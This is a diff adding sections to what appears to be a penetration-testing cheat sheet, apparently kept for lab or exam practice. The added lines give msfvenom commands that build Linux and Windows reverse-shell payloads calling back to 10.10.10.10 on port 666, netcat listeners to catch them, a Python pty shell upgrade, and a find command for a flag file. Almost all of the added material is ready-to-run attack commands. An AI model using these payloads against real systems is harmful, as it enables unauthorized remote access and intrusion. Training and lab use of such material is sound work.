@@ -86,3 +86,26 @@ Get-NetTCPConnection |Select-Object -Property LocalPort, State, @{name='ProcessI
 ```
 Get-NetTCPConnection |Select-Object -Property LocalPort, State, @{name='ProcessID';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). ID}}, @{name='ProcessName';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Path}}, @{name='User';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Username}}  | ?{$_.LocalPort -eq 30900} | Format-Table
 ```
+## MSFVENOM
+##### REVERSE SHELL - LINUX x64
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=666 -f elf -o shell666.elf
+```
+```
+nc -nvlp 666
+```
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+##### REVERSE SHELL - WINDOWS x64
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=666 -f exe -o reverse.exe
+```
+```
+nc -nvlp 666
+```
+## FINDIND FILES
+##### LINUX - FINDING FILES
+```
+find / -name local.txt 2> /dev/null
+```
